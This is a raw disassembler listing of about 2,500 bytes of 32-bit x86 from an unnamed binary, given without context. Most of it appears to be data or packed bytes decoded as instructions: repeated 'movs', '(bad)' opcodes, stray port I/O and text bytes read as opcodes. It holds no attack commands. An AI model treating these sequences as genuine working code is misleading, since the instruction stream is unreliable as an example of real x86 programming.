  4223ec:	rol    DWORD PTR [edx-0x5b6a732f],cl
  4223f2:	adc    eax,0x1a49ba4
  4223f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223f8:	popf   
  4223f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223fa:	jno    0x4223a0
  4223fc:	xchg   edi,eax
  4223fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223fe:	or     esp,DWORD PTR [ecx+ecx*4-0x7c5bac5c]
  422405:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422406:	xor    eax,0x9ba485a4
  42240b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42240c:	mov    ebx,0xd1e2d3a4
  422411:	in     al,dx
  422412:	xchg   ebp,eax
  422413:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422414:	adc    eax,0x3ba49ba4
  422419:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42241a:	popf   
  42241b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42241c:	sbb    DWORD PTR [ebp+edx*4-0x705b805c],esp
  422423:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422424:	fwait
  422425:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422426:	xchg   DWORD PTR [ebx+edx*8-0xe332e3e],esp
  42242d:	sub    al,0xf7
  42242f:	cs pop ss
  422431:	push   cs
  422432:	adc    eax,0x3a49108
  422437:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422438:	fwait
  422439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42243a:	add    esp,DWORD PTR [ebx+edx*4-0x6a5b805c]
  422441:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422442:	sbb    DWORD PTR [ebp+ecx*4-0x7c5b645c],esp
  422449:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42244a:	shl    DWORD PTR [edx],cl
  42244c:	shr    DWORD PTR [ecx+esi*8],1
  42244f:	or     al,0xf7
  422451:	push   cs
  422452:	pop    ss
  422453:	outs   dx,BYTE PTR ds:[esi]
  422454:	adc    eax,0x3a49168
  422459:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42245a:	fwait
  42245b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42245c:	add    esp,DWORD PTR [ebx+edx*4-0x6a5b805c]
  422463:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422464:	xor    eax,0x9ba48da4
  422469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42246a:	and    DWORD PTR [ebx+edx*8-0xef32efe],0x6c
  422472:	imul   DWORD PTR [esi+0x17]
  422475:	dec    esi
  422476:	adc    eax,0x37a49148
  42247b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42247c:	fwait
  42247d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42247e:	jae    0x422424
  422480:	popf   
  422481:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422482:	sbb    DWORD PTR [ebp+edx*4-0x705bba5c],esp
  422489:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42248a:	fwait
  42248b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42248c:	and    DWORD PTR [ebx+edx*8-0xe932e9e],0x4c
  422494:	test   DWORD PTR [esi+0x16],0x91a814ae
  42249b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42249c:	aaa    
  42249d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42249e:	fwait
  42249f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224a0:	jae    0x422446
  4224a2:	popf   
  4224a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224a4:	pop    ss
  4224a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224a6:	xchg   ebp,eax
  4224a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224a8:	push   ecx
  4224a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224aa:	mov    DWORD PTR [ebx+ebx*4-0x2c5b725c],esp
  4224b1:	inc    edx
  4224b2:	ror    DWORD PTR [eax+esi*8-0x54],1
  4224b6:	imul   BYTE PTR [esi-0x77eb71ea]
  4224bc:	xchg   ecx,eax
  4224bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224be:	aaa    
  4224bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224c0:	fwait
  4224c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224c2:	jae    0x422468
  4224c4:	popf   
  4224c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224c6:	cmp    esp,DWORD PTR [ebp+edx*4-0x705b8c5c]
  4224cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ce:	fwait
  4224cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224d0:	xchg   DWORD PTR [edx+edx*8-0xf532f5e],esp
  4224d7:	mov    esi,?
  4224d9:	mov    ss,WORD PTR [esi]
  4224db:	out    dx,al
  4224dc:	adc    al,0xe8
  4224de:	xchg   ecx,eax
  4224df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224e0:	aaa    
  4224e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224e2:	fwait
  4224e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224e4:	jae    0x42248a
  4224e6:	popf   
  4224e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224e8:	cmp    DWORD PTR [ebp+edx*4-0x705b805c],esp
  4224ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f0:	fwait
  4224f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f2:	and    DWORD PTR [edx+edx*8-0xf732f7e],0xffffffec
  4224fa:	imul   dh
  4224fc:	push   ss
  4224fd:	into   
  4224fe:	adc    al,0xc8
  422500:	xchg   ecx,eax
  422501:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422502:	cmp    eax,0x51a49ba4
  422507:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422508:	popf   
  422509:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42250a:	jnp    0x4224b0
  42250c:	xchg   ebx,eax
  42250d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42250e:	fwait
  42250f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422510:	xchg   ecx,eax
  422511:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422512:	shl    dl,cl
  422514:	shr    ah,1
  422516:	lock int3 
  422518:	test   dh,0x16
  42251b:	cs adc al,0x28
  42251e:	push   ss
  42251f:	push   cs
  422520:	adc    al,0x8
  422522:	xchg   ebx,eax
  422523:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422524:	adc    DWORD PTR [ebx+ebx*4-0x605bb65c],esp
  42252b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42252c:	cmp    esp,DWORD PTR [ebx+edx*4-0x765b825c]
  422533:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422534:	fwait
  422535:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422536:	lea    esp,[edx+edx*8-0xfd32fde]
  42253d:	or     al,0xf6
  42253f:	push   cs
  422540:	push   ss
  422541:	outs   dx,BYTE PTR ds:[esi]
  422542:	adc    al,0x68
  422544:	xchg   ecx,eax
  422545:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422546:	add    BYTE PTR [eax],al
  422548:	shl    BYTE PTR [ebx],1
  42254a:	inc    edx
  42254b:	add    ah,bl
  42254d:	and    eax,0x25e40042
  422552:	inc    edx
  422553:	add    BYTE PTR [edi+eiz*1+0x42],ch
  422557:	add    al,cl
  422559:	and    eax,DWORD PTR [edx+0x0]
  42255c:	call   0x4a426786
  422561:	jl     0x4225a5
  422563:	add    dl,al
  422565:	jle    0x4225a9
  422567:	add    al,bl
  422569:	es inc edx
  42256b:	add    BYTE PTR [edi+eiz*1+0x42],bl
  42256f:	add    ah,al
  422571:	and    eax,0x25c80042
  422576:	inc    edx
  422577:	add    BYTE PTR [eax+0x27],bl
  42257a:	inc    edx
  42257b:	add    BYTE PTR [esi+eiz*1],ch
  42257e:	inc    edx
  42257f:	add    BYTE PTR [edx-0x35],cl
  422582:	push   es
  422583:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422584:	scas   al,BYTE PTR es:[edi]
  422585:	or     al,0x6
  422587:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422588:	loopne 0x4225af
  42258a:	inc    edx
  42258b:	add    BYTE PTR [eax-0x5bffbdda],dl
  422591:	es inc edx
  422593:	add    BYTE PTR [eax-0x3fffbdda],dh
  422599:	es inc edx
  42259b:	add    BYTE PTR [eax],bl
  42259d:	es inc edx
  42259f:	add    ah,cl
  4225a1:	and    eax,DWORD PTR [edx+0x0]
  4225a4:	cmp    BYTE PTR [esi],ah
  4225a6:	inc    edx
  4225a7:	add    BYTE PTR [eax],ch
  4225a9:	es inc edx
  4225ab:	add    BYTE PTR [eax+0x27],dh
  4225ae:	inc    edx
  4225af:	add    BYTE PTR [esi+0x38a4069a],ch
  4225b5:	inc    ebx
  4225b6:	out    0xbd,eax
  4225b8:	dec    eax
  4225b9:	es inc edx
  4225bb:	add    BYTE PTR [eax+0x26],dl
  4225be:	inc    edx
  4225bf:	add    ah,ch
  4225c1:	and    eax,0x87240042
  4225c6:	loopne 0x422585
  4225c8:	jbe    0x422645
  4225ca:	pop    ds
  4225cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225cc:	add    BYTE PTR [eax],al
  4225ce:	inc    eax
  4225cf:	add    dl,ch
  4225d1:	rcl    dl,cl
  4225d3:	pop    ecx
  4225d4:	mov    edi,0xdb00427e
  4225d9:	outs   dx,DWORD PTR fs:[esi]
  4225db:	arpl   WORD PTR [edi+0xf],si
  4225de:	pop    ebx
  4225df:	xor    DWORD PTR [esi-0x5],esi
  4225e2:	(bad)  
  4225e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4225e4:	mov    dl,0xc
  4225e6:	xchg   ebx,eax
  4225e7:	test   al,0xd4
  4225e9:	and    eax,0xdaaa0042
  4225ee:	push   es
  4225ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225f0:	stos   BYTE PTR es:[edi],al
  4225f1:	fiadd  WORD PTR [esi]
  4225f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225f5:	fiadd  DWORD PTR [esi]
  4225f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225f8:	mov    ds:0xbea406da,al
  4225fd:	fiadd  DWORD PTR [esi]
  4225ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422600:	mov    edx,0xb6a406da
  422605:	fiadd  DWORD PTR [esi]
  422607:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422608:	mov    dl,0xda
  42260a:	push   es
  42260b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42260c:	mov    ds,edx
  42260e:	push   es
  42260f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422610:	mov    bl,dl
  422612:	push   es
  422613:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422614:	out    dx,al
  422615:	fiadd  DWORD PTR [esi]
  422617:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422618:	dec    DWORD PTR [ebx]
  42261a:	adc    edi,DWORD PTR [edx]
  42261c:	les    esp,FWORD PTR [ebx]
  42261e:	inc    edx
  42261f:	add    BYTE PTR [ebp+0x17004228],dh
  422625:	loop   0x4225b0
  422627:	js     0x4225d7
  422629:	call   0xa4d7:0xcb3aa406
  422630:	and    al,0x75
  422632:	add    BYTE PTR [eax],al
  422634:	shl    BYTE PTR [ebx],0x42
  422637:	add    BYTE PTR [edx],ah
  422639:	inc    ebx
  42263a:	sbb    eax,DWORD PTR [edx+0x0]
	...
  422648:	hlt    
  422649:	clc    
  42264a:	sar    BYTE PTR [ebp+0x319340bf],cl
  422650:	sub    eax,DWORD PTR [edi+0x1f]
  422653:	jle    0x422655
	...
  422679:	add    BYTE PTR [eax],al
  42267b:	add    BYTE PTR [edx+0x7c],cl
  42267e:	inc    edx
	...
  42268b:	add    cl,bh
  42268d:	jmp    0xa48f26d3
  422692:	push   ecx
  422693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422694:	jg     0x42263a
  422696:	inc    edi
  422697:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422698:	push   ecx
  422699:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42269a:	inc    ebx
  42269b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42269c:	std    
  42269d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42269e:	jmp    DWORD PTR [ebx+ebx*4+0x550000a4]
  4226a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226a6:	push   ebx
  4226a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226a8:	dec    ecx
  4226a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226aa:	std    
  4226ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226ac:	jmp    DWORD PTR [ebx+ebx*4+0x7da471a4]
  4226b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226b4:	push   ecx
  4226b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226b6:	jg     0x42265c
  4226b8:	std    
  4226b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226ba:	jmp    DWORD PTR [ebx+ebx*4+0x7d0000a4]
  4226c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226c2:	dec    ebx
  4226c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226c4:	inc    ebx
  4226c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226c6:	jne    0x42266c
  4226c8:	pop    ecx
  4226c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226ca:	jnp    0x422670
  4226cc:	dec    ecx
  4226cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226ce:	fwait
  4226cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  4226d8:	xor    eax,eax
  4226da:	xor    esp,DWORD PTR [eax]
  4226dc:	xor    eax,DWORD PTR [eax]
  4226de:	xor    esp,DWORD PTR [eax+0x33]
  4226e1:	inc    eax
  4226e2:	xor    ah,BYTE PTR [eax-0x1fcd7fce]
  4226e8:	xor    al,al
  4226ea:	xor    ah,BYTE PTR [eax]
  4226ec:	xor    al,BYTE PTR [eax]
  4226ee:	xor    ah,BYTE PTR [eax+0x32]
  4226f1:	inc    eax
  4226f2:	xor    eax,DWORD PTR [eax-0x3dcc1fcd]
  4226f8:	xor    ecx,esp
  4226fa:	xor    ecx,esi
  4226fc:	xor    ecx,eax
  4226fe:	xor    ecx,edx
  422700:	xor    edx,esp
  422702:	xor    edx,esi
  422704:	xor    edx,eax
  422706:	xor    edx,edx
  422708:	xor    ebx,esp
  42270a:	xor    ebx,esi
  42270c:	xor    ebx,eax
  42270e:	xor    ebx,edx
  422710:	xor    eax,esi
  422712:	push   ebx
  422713:	shl    BYTE PTR [ebx-0x40],0x93
  422717:	rcl    DWORD PTR [esi-0x56],0x15
  42271b:	into   
  42271c:	xchg   ebp,eax
  42271d:	dec    ecx
  42271e:	xor    ecx,esp
  422720:	sbb    eax,0x50abaae2
  422725:	push   0x1e
  422727:	cs je  0x42273e
  42272a:	mov    DWORD PTR [ebx+0x546ad794],ecx
  422730:	imul   edi,edx,0xffffffd5
  422733:	leave  
  422734:	daa    
  422735:	dec    eax
  422736:	out    dx,eax
  422737:	pushf  
  422738:	mov    dh,0xdf
  42273a:	dec    esi
  42273b:	xchg   ebp,eax
  42273c:	lock xor DWORD PTR [esi-0x6c],ebp
  422740:	inc    ebp
  422741:	or     eax,0xc1470876
  422746:	js     0x422703
  422748:	popa   
  422749:	pop    ecx
  42274a:	jecxz  0x4227b7
  42274c:	mov    BYTE PTR [edx-0x56],0x5
  422750:	cs enter 0xaa46,0x44
  422755:	aas    
  422756:	inc    ebp
  422757:	leave  
  422758:	test   BYTE PTR [ebx+0x819a593],0xd8
  42275f:	jl     0x4227b9
  422761:	mov    es,WORD PTR [edx+0x0]
  422764:	jb     0x4227c0
  422766:	pop    ss
  422767:	sub    ecx,esp
  422769:	and    eax,0x26300042
  42276e:	inc    edx
  42276f:	add    BYTE PTR [esi-0x5],dh
  422772:	fbld   TBYTE PTR [ebp+0x0]
	...
  422780:	adc    edi,DWORD PTR [edx+0x6f6bd319]
  422786:	popa   
  422787:	arpl   WORD PTR [edi+0x7a],bp
  42278a:	popa   
  42278b:	outs   dx,DWORD PTR ds:[si]
  42278d:	gs ins DWORD PTR es:[edi],dx
  42278f:	jae    0x4227d3
  422791:	outs   dx,DWORD PTR ds:[esi]
  422792:	ins    BYTE PTR es:[edi],dx
  422793:	gs mov cl,0x65
  422796:	in     eax,dx
  422797:	jg     0x4227d2
  422799:	ja     0x422804
  42279b:	jp     0x422790
  42279d:	inc    esp
  42279e:	push   0x1b
  4227a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227a1:	push   ecx
  4227a2:	dec    esp
  4227a3:	gs jb  0x42281f
  4227a6:	popa   
  4227a7:	push   ebx
  4227a8:	jne    0x42281b
  4227aa:	jae    0x42280d
  4227ac:	imul   esi,DWORD PTR [edx+0x6f],0x91565070
  4227b3:	inc    esp
  4227b4:	(bad)  [edx+0x65]
  4227b7:	jae    0x42280f
  4227b9:	imul   esi,DWORD PTR [ebx+0x61],0x616c6974
  4227c0:	jb     0x422824
  4227c2:	gs je  0x422798
  4227c5:	lds    edx,FWORD PTR [eax-0x68]
  4227c8:	xor    dl,BYTE PTR [eax+ecx*1+0x1d]
  4227cc:	fs jne 0x42283e
  4227cf:	push   eax
  4227d0:	gs fs jae 0x422841
  4227d4:	popa   
  4227d5:	ins    DWORD PTR es:[edi],dx
  4227d6:	imul   esi,DWORD PTR [ebx+0x0],0x0
	...
  4227e9:	add    BYTE PTR [eax],al
  4227eb:	add    BYTE PTR [esp+ecx*4],ch
  4227ee:	push   ss
  4227ef:	mov    esi,0x6f4c8773
  4227f4:	jb     0x422864
  4227f6:	jno    0x422861
  4227f8:	or     al,0x36
  4227fa:	lods   al,BYTE PTR ds:[esi]
  4227fb:	repnz push edx
  4227fd:	je     0x42286e
  4227ff:	je     0x422845
  422801:	js     0x4227bf
  422803:	cmc    
  422804:	outs   dx,DWORD PTR ds:[esi]
  422805:	ins    DWORD PTR es:[edi],dx
  422806:	popa   
  422807:	imul   esp,DWORD PTR [eax-0x77],0x67411cbf
  42280e:	popa   
  42280f:	jb     0x422886
  422811:	push   0x68736f79
  422816:	imul   ebp,DWORD PTR [esi+0x74],0x1d006261
  42281d:	mov    ch,0xa5
  42281f:	jns    0x422894
  422821:	outs   dx,DWORD PTR ds:[esi]
  422822:	addr16 popa 
  422824:	add    BYTE PTR [bp+si],bh
  422827:	sub    bh,cl
  422829:	icebp  
  42282a:	gs ins BYTE PTR es:[edi],dx
  42282c:	jae    0x422876
  42282e:	popa   
  42282f:	je     0x422899
  422831:	ins    DWORD PTR es:[edi],dx
  422832:	add    BYTE PTR gs:[bx+si],al
  422836:	in     al,dx
  422837:	mov    ecx,0x414ad1d2
  42283c:	ins    DWORD PTR es:[edi],dx
  42283d:	imul   esi,DWORD PTR [ebx+0x4b],0x676c686f
  422844:	gs ins DWORD PTR es:[edi],dx
  422846:	add    BYTE PTR [eax],al
  422848:	jne    0x42285a
  42284a:	popa   
  42284b:	or     BYTE PTR [esi+0x73654dbb],al
  422851:	popa   
  422852:	push   0x78000061
  422857:	loope  0x42289b
  422859:	stos   BYTE PTR es:[edi],al
  42285a:	je     0x4228bd
  42285c:	push   edi
  42285d:	popa   
  42285e:	jb     0x4228cb
  422860:	jae    0x4228cd
  422862:	imul   esi,DWORD PTR [edx+0x68],0x4100006f
  422869:	loope  0x422837
  42286b:	aad    0x6f
  42286d:	jb     0x4228db
  42286f:	imul   ebp,DWORD PTR [ebp+0x69],0x8b060000
  422876:	je     0x42288b
  422878:	adc    al,BYTE PTR [ebp+0x77646172]
  42287e:	outs   dx,DWORD PTR ds:[esi]
  42287f:	gs ins DWORD PTR es:[edi],dx
  422881:	imul   edi,DWORD PTR [eax+0x66],0x65706769
  422888:	outs   dx,BYTE PTR ds:[esi]
  422889:	shr    DWORD PTR fs:[ebx+0x61018e3a],cl
  422890:	ja     0x4228f6
  422892:	outs   dx,DWORD PTR ds:[esi]
  422893:	popa   
  422894:	outs   dx,BYTE PTR ds:[esi]
  422895:	gs jae 0x4228fa
  422898:	imul   ebp,DWORD PTR [edi+0x72],0x75536465
  42289f:	imul   esi,DWORD PTR [edi+edx*2+0x6f],0x2dea6576
  4228a7:	inc    ebx
  4228a8:	jb     0x422863
  4228aa:	sbb    al,0xd9
  4228ac:	jo     0x422917
  4228ae:	addr16 js 0x422926
  4228b1:	jo     0x422928
  4228b3:	fs add ch,cl
  4228b6:	xchg   esi,eax
  4228b7:	in     eax,dx
  4228b8:	jno    0x42292b
  4228ba:	iret   
  4228bb:	jbe    0x4228b6
  4228bd:	or     dh,BYTE PTR [esi-0x3]
  4228c0:	cwde   
  4228c1:	int    0xd6
  4228c3:	std    
  4228c4:	pop    ebp
  4228c5:	fsubr  DWORD PTR [edi]
  4228c7:	dec    edx
  4228c8:	xor    eax,0xd6cd860a
  4228cd:	stc    
  4228ce:	inc    ebx
  4228cf:	adc    DWORD PTR [eax+0x6e7988d6],ebp
  4228d5:	dec    edx
  4228d6:	sbb    BYTE PTR [ecx+0x52],bh
  4228d9:	mov    ch,al
  4228db:	jns    0x42292f
  4228dd:	dec    edx
  4228de:	sbb    BYTE PTR [ecx+0x6e],bh
  4228e1:	xchg   edx,eax
  4228e2:	cmp    eax,0xcd96c5cb
  4228e7:	in     eax,dx
  4228e8:	jno    0x42295b
  4228ea:	iret   
  4228eb:	jbe    0x4228e6
  4228ed:	or     dh,BYTE PTR [esi-0x3]
  4228f0:	int    0x96
  4228f2:	std    
  4228f3:	pop    ebp
  4228f4:	jns    0x422941
  4228f6:	pop    edx
  4228f7:	xor    eax,0x96cd920a
  4228fc:	stc    
  4228fd:	inc    ebx
  4228fe:	icebp  
  4228ff:	(bad)  
  422900:	das    
  422901:	int    0x76
  422903:	mov    BYTE PTR [ecx+0x6e],bh
  422906:	mov    DWORD PTR [edx-0x13749387],esi
  42290c:	jns    0x42297c
  42290e:	xchg   BYTE PTR [edi-0x3d789187],ah
  422914:	retf   
  422915:	rol    BYTE PTR [eax+eax*4+0x71edcd96],cl
  42291c:	jno    0x4228ed
  42291e:	jbe    0x422919
  422920:	or     dh,BYTE PTR [esi-0x3]
  422923:	int    0x96
  422925:	std    
  422926:	pop    ebp
  422927:	fdiv   DWORD PTR [ebx-0x6df55465]
  42292d:	int    0x96
  42292f:	stc    
  422930:	inc    ebx
  422931:	icebp  
  422932:	(bad)  
  422933:	test   BYTE PTR [ecx+0x6e],bh
  422936:	mov    ebp,esp
  422938:	int    0x76
  42293a:	mov    BYTE PTR [ecx+0x6e],bh
  42293d:	add    DWORD PTR [edi+0x79],0xcbd2896c
  422944:	rol    BYTE PTR [eax+eax*4+0x71edcd96],cl
  42294b:	jno    0x42291c
  42294d:	jbe    0x422948
  42294f:	or     dh,BYTE PTR [esi-0x3]
  422952:	cwde   
  422953:	int    0xd6
  422955:	std    
  422956:	pop    ebp
  422957:	ret    0x2be4
  42295a:	cmp    DWORD PTR [edx],ecx
  42295c:	xchg   ch,cl
  42295e:	(bad)  
  42295f:	stc    
  422960:	inc    ebx
  422961:	adc    DWORD PTR [eax+0x52794ad6],ebp
  422967:	test   BYTE PTR [ebx-0x78913648],ch
  42296d:	ret    0x79ab
  422970:	xchg   edx,eax
  422971:	aad    0xcb
  422973:	lds    edx,FWORD PTR [esi+0x7171edcd]
  422979:	iret   
  42297a:	jbe    0x422975
  42297c:	or     dh,BYTE PTR [esi-0x3]
  42297f:	int    0x96
  422981:	std    
  422982:	pop    ebp
  422983:	pop    ecx
  422984:	ins    BYTE PTR es:[edi],dx
  422985:	cmp    dh,BYTE PTR ds:0x96cd920a
  42298b:	stc    
  42298c:	inc    ebx
  42298d:	icebp  
  42298e:	(bad)  
  42298f:	push   ebx
  422990:	int    0x76
  422992:	mov    BYTE PTR [ecx+0x6e],bh
  422995:	mov    BYTE PTR [edi+0x47816c79],ah
  42299b:	jns    0x422a0b
  42299d:	test   DWORD PTR [ebx-0x7f7b2d35],esp
  4229a3:	call   0xcded:0xcd965b98
  4229aa:	jbe    0x4229e0
  4229ac:	xor    DWORD PTR [esi+0x3c],0xd6cdfd70
  4229b3:	sbb    al,0x81
  4229b5:	(bad)  
  4229b6:	and    al,0x98
  4229b8:	int    0xd6
  4229ba:	adc    al,0x47
  4229bc:	mov    ds:0xff8eca62,al
  4229c1:	add    al,0x7d
  4229c3:	add    ch,dl
  4229c5:	lods   eax,DWORD PTR ds:[esi]
  4229c6:	clc    
  4229c7:	icebp  
  4229c8:	jo     0x422994
  4229ca:	(bad)  
  4229cc:	jge    0x4229ce
  4229ce:	aad    0xad
  4229d0:	clc    
  4229d1:	icebp  
  4229d2:	jo     0x422966
  4229d4:	adc    ecx,ebp
  4229d6:	inc    DWORD PTR [ebp*8+0x6c6d334c]
  4229dd:	jo     0x422a4f
  4229df:	jo     0x422a51
  4229e1:	jo     0x42297d
  4229e3:	xor    esi,edi
  4229e5:	cwde   
  4229e6:	add    al,0xc
  4229e8:	add    BYTE PTR [ebp-0x80],bl
  4229eb:	xchg   DWORD PTR [eax-0x30522a80],eax
  4229f1:	or     DWORD PTR [eax-0x75],ebx
  4229f4:	add    BYTE PTR [eax-0x7f7b7fa3],0x84
  4229fb:	jecxz  0x4229e8
  4229fd:	hlt    
  4229fe:	scas   eax,DWORD PTR es:[edi]
  4229ff:	rol    BYTE PTR [ebp-0x6def4262],0x80
  422a06:	sub    dl,0xfa
  422a09:	iret   
  422a0a:	pop    eax
  422a0b:	iret   
  422a0c:	push   0xffffffcd
  422a0e:	out    0xfd,al
  422a10:	int    0x76
  422a12:	adc    DWORD PTR [ebx],esi
  422a14:	out    0x34,al
  422a16:	sub    ecx,ecx
  422a18:	or     dh,BYTE PTR [esi-0x43]
  422a1b:	rol    BYTE PTR [eax-0x7f6d1243],1
  422a21:	sub    BYTE PTR [edi],0x6
  422a24:	sub    DWORD PTR [eax-0x72357f80],eax
  422a2a:	cmc    
  422a2b:	sub    esp,esi
  422a2d:	in     eax,dx
  422a2e:	aad    0xe9
  422a30:	add    ebx,ebp
  422a32:	mov    bh,dh
  422a34:	fcmovnbe st,st(5)
  422a36:	out    dx,eax
  422a37:	pushf  
  422a38:	xchg   edi,edi
  422a3a:	test   al,0xcf
  422a3c:	fs adc ebx,0xffffffe9
  422a40:	mov    BYTE PTR [ebx+ecx*4-0x60],ah
  422a44:	iret   
  422a45:	int3   
  422a46:	call   0x80c2790f
  422a4b:	jno    0x4229e5
  422a4d:	imul   eax,DWORD PTR [eax+0x70808081],0x548281d0
  422a57:	int    0xe6
  422a59:	std    
  422a5a:	xor    esp,esi
  422a5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a5d:	das    
  422a5e:	pop    ecx
  422a5f:	push   0xffffffcd
  422a61:	(bad)  
  422a62:	or     eax,0xfcde9e3
  422a67:	sub    edi,eax
  422a69:	xchg   DWORD PTR [edi],ecx
  422a6b:	iret   
  422a6c:	les    ecx,FWORD PTR [ebp-0x6da04280]
  422a72:	add    BYTE PTR [eax-0x102c8233],0x88
  422a79:	add    al,0xf2
  422a7b:	add    DWORD PTR [ebx+0x2],0x80818069
  422a82:	adc    dh,0x4e
  422a85:	inc    ebx
  422a86:	jns    0x422a0a
  422a88:	fldlg2 
  422a8a:	es int 0xc6
  422a8d:	or     eax,0x809221bd
  422a92:	add    al,0x81
  422a95:	mov    al,ds:0xfb87d287
  422a9a:	add    al,0xbd
  422a9c:	add    DWORD PTR [edi+ebp*8],0x436dcd81
  422aa3:	jns    0x422a72
  422aa5:	ins    DWORD PTR es:[edi],dx
  422aa6:	and    ch,0xa0
  422aa9:	push   edx
  422aaa:	add    al,0x3
  422aac:	test   DWORD PTR [edx+0x2f8213cd],ecx
  422ab2:	push   edx
  422ab3:	add    al,0x3
  422ab5:	push   ebx
  422ab6:	mov    al,cl
  422ab8:	test   bh,bh
  422aba:	retf   
  422abb:	add    BYTE PTR [ecx+eax*8+0x33cbff8b],0xe3
  422ac3:	(bad)  
  422ac4:	in     al,dx
  422ac5:	outs   dx,DWORD PTR ds:[esi]
  422ac6:	rcl    bl,1
  422ac8:	(bad)  
  422ac9:	jge    0x422a88
  422acb:	outs   dx,DWORD PTR ds:[esi]
  422acc:	xchg   edx,eax
  422acd:	add    BYTE PTR [eax-0x5563eb2a],0xa0
  422ad4:	sahf   
  422ad5:	mov    al,ds:0x3454009e
  422ada:	jno    0x422b3e
  422adc:	popa   
